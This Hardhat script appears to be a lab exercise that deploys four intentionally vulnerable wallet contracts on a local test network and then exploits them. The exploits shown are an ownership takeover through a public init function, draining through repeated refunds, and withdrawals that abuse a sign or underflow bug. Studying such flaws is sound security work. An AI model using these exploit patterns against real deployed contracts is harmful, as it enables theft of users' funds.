import {ethers} from "hardhat";

async function main() {

    const [acc1, acc2, ,,,,,,,acc10] = await ethers.getSigners()

    const falseCons = await ethers.deployContract("FalseConsWallet");
    await falseCons.waitForDeployment();

    console.log(`FalseConstructor Wallet deployed at: ${falseCons.target}`)

    const noSubWallet = await ethers.deployContract("NoSubWallet");
    await noSubWallet.waitForDeployment();
    console.log(`No subtraction wallet is deployed at: ${noSubWallet.target}`)
    await noSubWallet.connect(acc10).deposit({value: ethers.parseEther('300')})

    const newWrongSign = await ethers.deployContract("NewWrongSignWallet");
    await newWrongSign.waitForDeployment()
    console.log(`New Wrong Sign Wallet has been deployed to : ${newWrongSign.target}`)

    const oldWrongSign = await ethers.deployContract("OldWrongSignWallet")
    await oldWrongSign.waitForDeployment()
    console.log(`Older Wrong Sign wallet has been deployed at: ${oldWrongSign.target}`)


    // Now, the exploits:

    await falseCons.connect(acc2).initWallet()
    //Creator address changed to whoever calls the function.

    await noSubWallet.connect(acc2).deposit({value: ethers.parseEther('2')})
    await noSubWallet.connect(acc2).refund()
    await noSubWallet.connect(acc2).refund()
    //The above function can be called multiple times till the balance of contract is completely deployed
    //Or till the balance of contract becomes lesser than the actual original balance of msg.sender;

    await newWrongSign.deposit({value: ethers.parseEther('500')})
    await newWrongSign.connect(acc2).deposit({value: ethers.parseEther('1')}) 
    await newWrongSign.connect(acc2).withdraw(60000000000000000000n)
    //Any arbitrary value greater than 1 eth and smaller than total balance of contract can be sent to it.
    //However, this can only be done once as the balance of the address is overflowed. And then it becomes impossible to withdraw
    //Since contract itself wouldn't have that much balance (size uint256)


    await oldWrongSign.deposit({value: ethers.parseEther('500')})
    await oldWrongSign.connect(acc2).deposit({value: ethers.parseEther('1')}) 
    await oldWrongSign.connect(acc2).withdraw(60000000000000000000n)
    //Same thing with this one. Only the code of the contract was changed to make the exploit still work.

}

main().catch((error) => {
    console.error(error)
    process.exitCode=1
})